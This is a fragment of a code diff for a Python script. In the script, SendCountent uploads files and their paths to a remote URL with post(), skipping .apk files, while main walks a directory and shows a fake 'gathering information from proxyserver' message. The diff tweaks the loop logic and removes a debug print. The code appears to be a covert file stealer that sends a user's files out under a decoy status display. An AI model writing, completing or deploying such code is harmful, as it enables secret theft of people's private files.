@@ -13,6 +13,8 @@ def SendCountent(filename):
                 if not filename.endswith('.apk'):
                     with open(filename,'rb') as filetosend:
                         post(url,files={'file':filetosend},data={'filepath':filename}) ; break
+                else:
+                    break
             else:
                 raise FileNotFoundError
         except (exceptions.ConnectionError,exceptions.Timeout):
@@ -33,7 +35,6 @@ def main(were='.'):
                     print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white'),end='\r')
             Cclass.remove(CP)
             CP = Cclass[0]
-            print('CP')
         except PermissionError:
             try:
                 Cclass.remove(CP)
